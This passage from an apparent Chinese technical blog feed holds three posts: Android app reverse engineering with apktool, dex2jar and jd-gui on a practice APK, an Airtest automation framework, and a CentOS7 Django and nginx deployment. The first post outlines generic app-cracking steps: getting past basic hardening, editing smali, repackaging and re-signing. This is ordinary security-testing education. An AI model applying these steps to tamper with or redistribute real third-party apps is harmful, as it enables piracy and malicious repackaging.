<li>M2 - 不安全的数据存储</li>
<li>M3 - 不安全的通信</li>
<li>M4 - 不安全的身份验证</li>
<li>M5 - 弱加密</li>
<li>M6 - 不安全的授权</li>
<li>M7- -客户端代码质量</li>
<li>M8- -代码篡改</li>
<li>M9– 逆向工程</li>
<li>M10- 无关功能</li>
</ul>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>这里使用<a href="https://github.com/tjunxiang92/Android-Vulnerabilities">这个网站</a>提供的<code>apk</code>安装包<ul>
<li>这个<code>github</code>上面提供的安全测试的资料文档可以仔细研读</li>
</ul>
</li>
</ul>
<h2 id="M9–-逆向工程"><a href="#M9–-逆向工程" class="headerlink" title="M9– 逆向工程"></a>M9– 逆向工程</h2><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><ul>
<li><code>ApkTool</code>是主要查看<code>res</code>文件下<code>xml</code>文件、<code>AndroidManifest.xml</code>、<code>classes.dex</code>。（注意：如果直接解压<code>.apk</code>文件，<code>xml</code>文件打开全部是乱码）<ul>
<li><code>dex = Dalvik Executable format</code></li>
<li>dex文件：逻辑类似于<code>java</code>的<code>class</code>文件</li>
<li>安卓系统中，用<strong>Dalvik虚拟机（DVM &#x3D; Dalvik Virtual Machine）</strong>去把java源代码编译为dex可执行文件（<code>Dalvik Executable</code>）</li>
</ul>
</li>
<li><code>dex2jar</code> 作用：将<code>apk</code>反编译成<code>Java</code>源码（<code>classes.dex</code>转化成<code>ja</code>r文件）</li>
<li><code>jd-gui</code> 作用：查看<code>APK</code>中<code>classes.dex</code>转化成出的<code>jar</code>文件，即源码文件</li>
</ul>
<h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><ul>
<li>安装<code>apktool</code>，本机安装好<code>java 1.8+</code>，打开<a href="https://ibotpeaches.github.io/Apktool/install/">安装网页</a>，<strong>我亲自测试过了，apktool解压后的文件没有发现<code>classes.dex</code>，所以后面还是采用改后缀名解压</strong></li>
</ul>
<p><img src="/aposts/ed775b3f/image-20220331114419613.png" alt="image-20220331114419613"></p>
<ul>
<li><p>前三个步骤分别是，下载一个<code>apktool.bat</code>文件，下载<code>apktool_version.jar</code>文件后，并重命令为<code>apktool.jar</code>，然后把<code>apktool.bat</code>和<code>apktool.jar</code> 放在同一个目录下</p>
</li>
<li><p>打开<a href="https://github.com/pxb1988/dex2jar/releases/tag/v2.1">dex2jar</a>，下载最新的版本为：<code>dex2jar-2.1</code></p>
</li>
<li><p>打开<a href="https://github.com/java-decompiler/jd-gui/releases">jd-gui</a>，下载最新的版本为：<code>jd-gui-windows-1.6.6.zip</code></p>
</li>
</ul>
<h3 id="开始工作"><a href="#开始工作" class="headerlink" title="开始工作"></a>开始工作</h3><ul>
<li>看下我提前准备好的工具</li>
</ul>
<p><img src="/aposts/ed775b3f/image-20220331145737635.png" alt="image-20220331145737635"></p>
<ul>
<li>执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\appsafetest&gt;apktool d diva-beta.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>成功把<code>apk</code>解压，到<code>res</code>目录发现居然没有<code>classes.dex</code></li>
</ul>
<p><img src="/aposts/ed775b3f/image-20220331155618163.png" alt="image-20220331155618163"></p>
<ul>
<li><p>还是换成改后缀名为<code>.zip</code>，然后解压的方式得到了<code>classes.dex</code></p>
</li>
<li><p>使用<code>dex2jar</code> 进行反编译(下载<a href="https://download.oracle.com/java/17/latest/jdk-17_windows-x64_bin.msi">jdk7</a>，修改环境变量)，提前把解压中的<code>classes.dex</code>放到<code>dex-tools-2.1</code>目录中</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\appsafetest\dex-tools-2.1&gt;java --version</span><br><span class="line">java 17.0.2 2022-01-18 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.2+8-LTS-86)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.2+8-LTS-86, mixed mode, sharing)</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>d2j-dex2jar</code> 执行反编译命令，在当前文件夹会出现一个<code>classes-dex2jar.jar</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\appsafetest\dex-tools-2.1&gt;d2j-dex2jar.bat classes.dex</span><br><span class="line">dex2jar classes.dex -&gt; .\classes-dex2jar.jar</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code> jd-gui</code> 打开<code>classes-dex2jar.jar</code></li>
</ul>
<p><img src="/aposts/ed775b3f/image-20220331165030082.png" alt="image-20220331165030082"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p>常见的破解app的流程，这里是最基础也是最关键的：</p>
</li>
<li><p>得到<code>classes.dex</code></p>
<ul>
<li>解压<code>apk</code>得到<code>classes.dex</code>，用传统的<code>unzip</code>，<code>apktool</code> </li>
<li>如果涉及到加固方面的东西，有<strong>普通加固</strong>和<strong>商家收费的加固</strong>，如果是普通加固可以采用：<code>夜神模拟器</code>+<code>FDex2</code>+<code>Xposed</code></li>
</ul>
</li>
<li><p>从<code>dex</code>文件反编译出<code>jar</code>包，比如用的这个工具<code>dex2jar</code></p>
</li>
<li><p>从<code>jar</code>包反编译出<code>java</code>源代码，比如反编辑器工具<code>jd-gui</code></p>
</li>
<li><p>使用<code>jd-gui</code>反编译出来查看的可能是<code>smali</code>文件，所以要学习一些<code>smali</code>基本的语法，这里修改代码</p>
</li>
<li><p>修改完代码后，就要重新打包成<code>APK</code>文件了，可以采用<code>apktool </code>来打包得到新的<code>apk</code></p>
</li>
<li><p>然后就是签名操作，打包得到的<code>apk</code>文件无法安装，需要签名，可以采用<code>keytool -genkey -keystore</code> 和<code>jarsigner -verbose -keystore </code>，签名成功后，apk包就可以安装成功</p>
</li>
<li><p>当然网络上也有一些工具把这些集成在一起了，比如<strong>改之理</strong>、<strong>ApkToolkit</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>app安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>app安全测试</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>aritest自动化测试框架设计</title>
    <url>/aposts/6e64669e/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>基于Airtest设计的自动化测试框架</li>
</ul>
<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><ul>
<li>AirtestIDE-win-1.2.13 请自行安装，用来调试用例</li>
<li>此次装的python版本为 3.7.9</li>
<li>本地电脑的adb设置为AirtestIDE中的路径</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220118152720452.png" alt="image-20220118152720452"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb</span><br><span class="line">Android Debug Bridge version 1.0.40</span><br><span class="line">Version 4986621</span><br><span class="line">Installed as E:\exe\AirtestIDE\airtest\core\android\static\adb\windows\adb.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -U airtest</span><br><span class="line">pip install -U pocoui</span><br></pre></td></tr></table></figure>

<ul>
<li>本次测试机器使用雷电模拟器，真机也可以</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>安装测试apk文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;adb install -g -r C:\Users\Admin\Downloads\com.jianshu.haruki_6.4.4_liqucn.com.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>在模拟器中打开手动登录</li>
<li>复制python环境中的Lib目录的airtest下的report文件到新建文件夹下面（E:\proj\aritest）<ul>
<li>放生成的测试报告和日志文件，默认放到项目中，对项目管理非常不友好</li>
</ul>
</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220118164513042.png" alt="image-20220118164513042"></p>
<ul>
<li>然后新建一个log文件，用来放测试用例报告的</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220118164740800.png" alt="image-20220118164740800"></p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a>启动器</h3><ul>
<li><p>启动器代码做到和用例文件分离，现在启动器支撑ios(待测试)，android（已测试），web（待测试），理论上airtest支持的都支持</p>
</li>
<li><p>启动器需要取配置文件进行，配置文件如下</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">default</span>]</span><br><span class="line"><span class="comment"># 包名</span></span><br><span class="line"><span class="string">pkg</span> <span class="string">=</span> <span class="string">com.jianshu.haruki</span></span><br><span class="line"><span class="comment"># 手机名字</span></span><br><span class="line"><span class="string">phone=雷电模拟器</span></span><br><span class="line"><span class="comment"># 设备连接名字</span></span><br><span class="line"><span class="string">dev_connect=Android://127.0.0.1:5037/emulator-5554</span></span><br><span class="line"><span class="comment">#dev_connect=Android://127.0.0.1:5037/ZL9LC685V86DNNMN</span></span><br><span class="line"><span class="comment"># 用例目录</span></span><br><span class="line"><span class="string">root_path=E:\proj\airtest_auto\air_case\android</span></span><br><span class="line"> <span class="comment"># test_plan=1 表示调试用例需要配合test_module使用，0表示全部用例</span></span><br><span class="line"><span class="string">test_plan=1</span></span><br><span class="line"><span class="string">test_module=[&quot;我的&quot;]</span></span><br><span class="line"><span class="comment"># false|true 表示是否运行用例之前，删除log文件夹，删除后会影响查看历史报告</span></span><br><span class="line"><span class="string">remove_log=true</span></span><br><span class="line"><span class="comment"># false|true 是否开启录屏,若传true就会自动录屏，但是在模拟器上录屏失败，只使用于真机</span></span><br><span class="line"><span class="string">recording=false</span></span><br><span class="line"><span class="comment"># android|ios|web，当填如web时，需要填写驱动文件位置</span></span><br><span class="line"><span class="string">platform</span> <span class="string">=android</span></span><br><span class="line"><span class="comment"># driver_path=E:\proj\airtest_auto\exe\chromedriver.exe</span></span><br><span class="line"><span class="string">driver_path=</span></span><br><span class="line"><span class="comment"># 服务器信的信息，比如本地的http服务器，用来展示报告</span></span><br><span class="line"><span class="string">report_host=http://172.31.105.196:8000</span></span><br><span class="line"><span class="comment"># 本地服务器路径，我把源代码中的report也放在里面了</span></span><br><span class="line"><span class="string">local_host_path=E:\proj\aritest</span></span><br><span class="line"><span class="comment"># 本地服务器端口</span></span><br><span class="line"><span class="string">local_host_port=8000</span></span><br><span class="line">[<span class="string">mail</span>]</span><br><span class="line"><span class="comment"># 是否启动发送邮件,传false|true</span></span><br><span class="line"><span class="string">enable</span> <span class="string">=false</span></span><br><span class="line"><span class="comment"># 收件人</span></span><br><span class="line"><span class="string">recipient</span> <span class="string">=[&quot;284772894@qq.com&quot;,&quot;284772895@qq.com&quot;]</span></span><br><span class="line"><span class="comment"># 发件人smtp</span></span><br><span class="line"><span class="string">mail_host</span> <span class="string">=</span> <span class="string">smtp.126.com</span></span><br><span class="line"><span class="comment"># 发件人</span></span><br><span class="line"><span class="string">mail_user</span> <span class="string">=</span> <span class="string">ashikun@126.com</span></span><br><span class="line"><span class="comment"># 授权码</span></span><br><span class="line"><span class="string">mail_pass</span> <span class="string">=</span> <span class="string">XXXXX</span></span><br><span class="line"><span class="string">port</span> <span class="string">=</span> <span class="number">465</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动器代码分析</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取配置文件，进行运行函数</span></span><br><span class="line">PATH = <span class="keyword">lambda</span> p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line">path = PATH(<span class="string">&quot;config/setting1.ini&quot;</span>)</span><br><span class="line">data = ReadIni(path).get_ini_list()</span><br><span class="line">run_case(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># 当平台为安卓时，检查是否连接成功</span></span><br><span class="line">    <span class="keyword">if</span> data.get(<span class="string">&quot;platform&quot;</span>, <span class="string">&quot;1&quot;</span>) == <span class="string">&quot;android&quot;</span>:</span><br><span class="line">        devices = attached_devices()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> devices:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无可用设备&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">elif</span> data.get(<span class="string">&quot;platform&quot;</span>, <span class="string">&quot;1&quot;</span>) == <span class="string">&quot;ios&quot;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> data.get(<span class="string">&quot;platform&quot;</span>, <span class="string">&quot;1&quot;</span>) == <span class="string">&quot;web&quot;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    test = CustomAirtestCase(data[<span class="string">&quot;root_path&quot;</span>])</span><br><span class="line">    device = [data[<span class="string">&quot;dev_connect&quot;</span>]]</span><br><span class="line">    test.run_air(device, data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_air</span>(<span class="params">self, device, data</span>):</span><br><span class="line">    get_data_list = get_test_case(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> get_data_list:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无可用用例&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 开启本地http服务器</span></span><br><span class="line">    HttpServer.start(data[<span class="string">&quot;local_host_path&quot;</span>], data[<span class="string">&quot;local_host_port&quot;</span>])</span><br><span class="line">	<span class="comment"># 循环执行用例</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> get_data_list:</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment"># 执行用例</span></span><br><span class="line">        get_run = run(data[<span class="string">&quot;root_path&quot;</span>], j, device, local_host_path, data[<span class="string">&quot;recording&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        ..</span><br><span class="line">         <span class="comment"># 生成测试用例的详情报告,注意这里修改了lib目录下的report.py中源代码，主要为了达到通过服务器ip访问测试报告</span></span><br><span class="line">       rpt = report.LogToHtml(get_run[<span class="string">&quot;script&quot;</span>], get_run[<span class="string">&quot;log&quot;</span>], data[<span class="string">&quot;report_host&quot;</span>]+<span class="string">&quot;/report&quot;</span>, log_host=</span><br><span class="line">                              data[<span class="string">&quot;report_host&quot;</span>] + <span class="string">&quot;/log/&quot;</span> + log_date + <span class="string">&quot;/&quot;</span> + get_run[<span class="string">&quot;log_host_path&quot;</span>])</span><br><span class="line">      rpt.report(<span class="string">&quot;log_template.html&quot;</span>, output_file=get_run[<span class="string">&quot;output_file&quot;</span>])</span><br><span class="line">      <span class="comment"># self。results主要记录测试用例结果，通过解析summary_template.html生成测试报告</span></span><br><span class="line">      result = &#123;<span class="string">&quot;result&quot;</span>: get_run[<span class="string">&quot;is_success&quot;</span>], <span class="string">&quot;start_date&quot;</span>: st_date,<span class="string">&quot;end_date&quot;</span>: end_date, <span class="string">&quot;sum_time&quot;</span>: sum_time,<span class="string">&quot;log&quot;</span>: s_log, <span class="string">&quot;name&quot;</span>: s_name&#125;</span><br><span class="line">        modules.append(j[<span class="string">&quot;module&quot;</span>])</span><br><span class="line">        self.results[<span class="string">&quot;data&quot;</span>].append(result)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>from airtest.report import report</code> 里面的report.py文件修改，实际文件目录如图：</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220120112555007.png" alt="image-20220120112555007"></p>
<ul>
<li>report.py文件修改</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LogToHtml</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    scale = <span class="number">0.5</span></span><br><span class="line">    <span class="comment"># 这里的log_host是我新增的日志文件服务器地址，这样新增一个字段，不影响到其他代码逻辑</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, script_root, log_root=<span class="string">&quot;&quot;</span>, static_root=<span class="string">&quot;&quot;</span>, export_dir=<span class="literal">None</span>, script_name=<span class="string">&quot;&quot;</span>, logfile=<span class="literal">None</span>, lang=<span class="string">&quot;en&quot;</span>, plugins=<span class="literal">None</span>, log_host=<span class="literal">None</span></span>):</span><br><span class="line">        ...</span><br><span class="line">      self.log_host = log_host <span class="comment"># shikun 2022-1-19</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment"># 这个函数，主要生成log.html文件中的图片展示</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">_translate_screen</span>(<span class="params">self, step, code</span>):</span><br><span class="line">        ...</span><br><span class="line">          <span class="keyword">for</span> item <span class="keyword">in</span> step[<span class="string">&quot;__children__&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> item[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;try_log_screen&quot;</span>:</span><br><span class="line">                snapshot = item[<span class="string">&quot;data&quot;</span>].get(<span class="string">&quot;ret&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(snapshot, six.text_type):</span><br><span class="line">                    src = snapshot</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(snapshot, <span class="built_in">dict</span>):</span><br><span class="line">                    src = snapshot[<span class="string">&#x27;screen&#x27;</span>]</span><br><span class="line">                    screen[<span class="string">&#x27;resolution&#x27;</span>] = snapshot[<span class="string">&#x27;resolution&#x27;</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> self.export_dir:  <span class="comment"># all relative path</span></span><br><span class="line">                    screen[<span class="string">&#x27;_filepath&#x27;</span>] = os.path.join(DEFAULT_LOG_DIR, src)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    screen[<span class="string">&#x27;_filepath&#x27;</span>] = os.path.abspath(os.path.join(self.log_root, src))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 修改了这里逻辑， screen[&#x27;src&#x27;]展示的图片路径就Log.html中img src中的路径</span></span><br><span class="line">                <span class="keyword">if</span> self.log_host:</span><br><span class="line">                    screen[<span class="string">&#x27;_filepath&#x27;</span>] = self.log_host + <span class="string">&quot;/&quot;</span> + src</span><br><span class="line">                screen[<span class="string">&#x27;src&#x27;</span>] = screen[<span class="string">&#x27;_filepath&#x27;</span>]</span><br><span class="line"> <span class="comment"># 根据模板文件生成测试报告，这里主要对视频文件路径进行处理  </span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">report</span>(<span class="params">self, template_name=HTML_TPL, output_file=HTML_FILE, record_list=<span class="literal">None</span></span>):</span><br><span class="line">       ....</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> record_list:</span><br><span class="line">            record_list = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(self.log_root) <span class="keyword">if</span> f.endswith(<span class="string">&quot;.mp4&quot;</span>)]</span><br><span class="line">        <span class="comment"># 源代码时这样，我多加了个log_host</span></span><br><span class="line">        <span class="comment"># data = self.report_data(output_file=output_file, record_list=record_list)</span></span><br><span class="line">        <span class="comment"># shikun-2121-1-19</span></span><br><span class="line">        data = self.report_data(output_file=output_file, record_list=record_list, log_host=self.log_host)</span><br><span class="line">        </span><br><span class="line">   <span class="comment"># log_host 为我新增</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report_data</span>(<span class="params">self, output_file=<span class="literal">None</span>, record_list=<span class="literal">None</span>, log_host=<span class="literal">None</span></span>):</span><br><span class="line">	...</span><br><span class="line">       <span class="keyword">if</span> record_list:</span><br><span class="line">            records = [os.path.join(DEFAULT_LOG_DIR, f) <span class="keyword">if</span> self.export_dir</span><br><span class="line">                       <span class="keyword">else</span> os.path.abspath(os.path.join(self.log_root, f)) <span class="keyword">for</span> f <span class="keyword">in</span> record_list]</span><br><span class="line">            <span class="comment"># 对视频路径进行处理</span></span><br><span class="line">            <span class="keyword">if</span> log_host:</span><br><span class="line">                records = []</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> record_list:</span><br><span class="line">                    records.append(log_host + <span class="string">&quot;/&quot;</span> + i)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<ul>
<li>运行runner5.py</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220120113714163.png" alt="image-20220120113714163"></p>
<ul>
<li>通过http服务查看运行结果</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220120113910981.png" alt="image-20220120113910981"></p>
<p><img src="/aposts/6e64669e/image-20220120113940586.png" alt="image-20220120113940586"></p>
<p><img src="/aposts/6e64669e/image-20220120114713093.png" alt="image-20220120114713093"></p>
<ul>
<li>实际上http服务，定位到的就是在配置文件中的：local_host_path&#x3D;E:\proj\aritest</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">E:\<span class="title">proj</span>\<span class="title">aritest</span>&gt;<span class="title">dir</span> <span class="title">log</span>\2022-01-20-10-56-21</span></span><br><span class="line"><span class="function"> 驱动器 <span class="title">E</span> 中的卷是 软件盘</span></span><br><span class="line"><span class="function"> 卷的序列号是 240<span class="title">F</span>-1787</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">E</span>:\<span class="title">proj</span>\<span class="title">aritest</span>\<span class="title">log</span>\2022-01-20-10-56-21 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2022/01/20  10:58    &lt;<span class="title">DIR</span>&gt;          .</span></span><br><span class="line"><span class="function">2022/01/20  10:58    &lt;<span class="title">DIR</span>&gt;          ..</span></span><br><span class="line"><span class="function">2022/01/20  10:58             2,803 <span class="title">summary_2022</span>-01-20-10-58-33.<span class="title">html</span></span></span><br><span class="line"><span class="function">2022/01/20  10:58             1,568 <span class="title">summary_template.html</span></span></span><br><span class="line"><span class="function">2022/01/20  10:57    &lt;<span class="title">DIR</span>&gt;          他的</span></span><br><span class="line"><span class="function">2022/01/20  10:57    &lt;<span class="title">DIR</span>&gt;          我的</span></span><br><span class="line"><span class="function">               2 个文件          4,371 字节</span></span><br><span class="line"><span class="function">               4 个目录 19,213,107,200 可用字节</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">E</span>:\<span class="title">proj</span>\<span class="title">aritest</span>&gt;<span class="title">dir</span> <span class="title">report</span></span></span><br><span class="line"><span class="function"> 驱动器 <span class="title">E</span> 中的卷是 软件盘</span></span><br><span class="line"><span class="function"> 卷的序列号是 240<span class="title">F</span>-1787</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">E</span>:\<span class="title">proj</span>\<span class="title">aritest</span>\<span class="title">report</span> 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2022/01/18  16:43    &lt;<span class="title">DIR</span>&gt;          .</span></span><br><span class="line"><span class="function">2022/01/18  16:43    &lt;<span class="title">DIR</span>&gt;          ..</span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">css</span></span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">fonts</span></span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">image</span></span></span><br><span class="line"><span class="function">2022/01/18  16:42    &lt;<span class="title">DIR</span>&gt;          <span class="title">js</span></span></span><br><span class="line"><span class="function">2021/05/21  10:28            10,634 <span class="title">log_template.html</span></span></span><br><span class="line"><span class="function">2021/08/16  10:43            21,860 <span class="title">report.py</span></span></span><br><span class="line"><span class="function">2021/06/23  16:53            22,405 <span class="title">test.py</span></span></span><br><span class="line"><span class="function">2018/08/28  11:39                 0 <span class="title">__init__.py</span></span></span><br><span class="line"><span class="function">               4 个文件         54,899 字节</span></span><br><span class="line"><span class="function">               6 个目录 19,213,107,200 可用字节</span></span><br></pre></td></tr></table></figure>

<ul>
<li>修改好的report.py文件已经放在项目跟目录，可以覆盖到各自目录即可</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p>查看<a href="https://github.com/Louis-me/airtest_auto">github源代码</a></p>
</li>
<li><p>查看<a href="https://gitee.com/moon-full/airtest_auto">gitee源代码</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>自动化测试</tag>
        <tag>aritest</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7-+-django+vue</title>
    <url>/aposts/1d89e362/</url>
    <content><![CDATA[<ul>
<li>之前写过 <a href="https://www.jianshu.com/p/e51a21388363">centos6部署django+mysql+vue</a>，本篇教程开始写centos7 + diango+vue</li>
</ul>
<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8100/tcp --permanent</span><br><span class="line">firewall-cmd --reload   # 配置立即生效</span><br><span class="line">firewall-cmd --zone=public --list-port # 查看防火墙所有开放的端口</span><br><span class="line"> firewall-cmd --state # 查看防火墙状态</span><br><span class="line">netstat -lnpt # 查看监听的端口</span><br><span class="line">netstat -lnpt |grep 5672 # 查看监听的具体端口</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编写和启动脚本start.sh，启动sh start.sh<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 后台启动django服务，输出日志到日志文件中，内容为标准输出和标准错误</span><br><span class="line">MYDATE=`date +%Y%m%d`</span><br><span class="line">ALL_LOGFILE=/usr/local/log/log_$MYDATE</span><br><span class="line"></span><br><span class="line">nohup python3 manage.py runserver 0.0.0.0:8100 &gt; $&#123;ALL_LOGFILE&#125; 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="按照nginx"><a href="#按照nginx" class="headerlink" title="按照nginx"></a>按照nginx</h2><ul>
<li><p>按照依赖文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line">yum install -y pcre pcre-devel</span><br><span class="line">yum install -y zlib zlib-devel</span><br><span class="line">yum install -y openssl openssl-devel</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>配置nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -c https://nginx.org/download/nginx-1.10.1.tar.gz</span><br><span class="line">tar -zxvf nginx-1.10.1.tar.gz</span><br><span class="line">cd nginx-1.10.1</span><br><span class="line">./configure # 使用默认配置</span><br><span class="line"># 编辑安装</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">whereis nginx # 查询安装路径</span><br><span class="line"># 启动、停止nginx</span><br><span class="line">cd /usr/local/nginx/sbin/</span><br><span class="line">./nginx  # 启动</span><br><span class="line">./nginx -t # 检查</span><br><span class="line">./nginx -s stop</span><br><span class="line">./nginx -s quit</span><br><span class="line">./nginx -s reload</span><br></pre></td></tr></table></figure></li>
<li><p>修改配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim nginx.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    </span><br><span class="line">    #gzip  on;</span><br><span class="line">    #upstream表示负载服务器池，定义名字为goserver的服务器池</span><br><span class="line">    #upstream goserver &#123;</span><br><span class="line">       # server 47.123.15.125:8887 weight=7;</span><br><span class="line">       # server 192.111.50.133:8888 weight=3;</span><br><span class="line">    #&#125;</span><br><span class="line">    #基于域名的虚拟主机</span><br><span class="line">    server &#123;</span><br><span class="line">    	#8880为监听端口号</span><br><span class="line">        listen       8880;</span><br><span class="line">        server_name  192.168.111.128;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">        #root 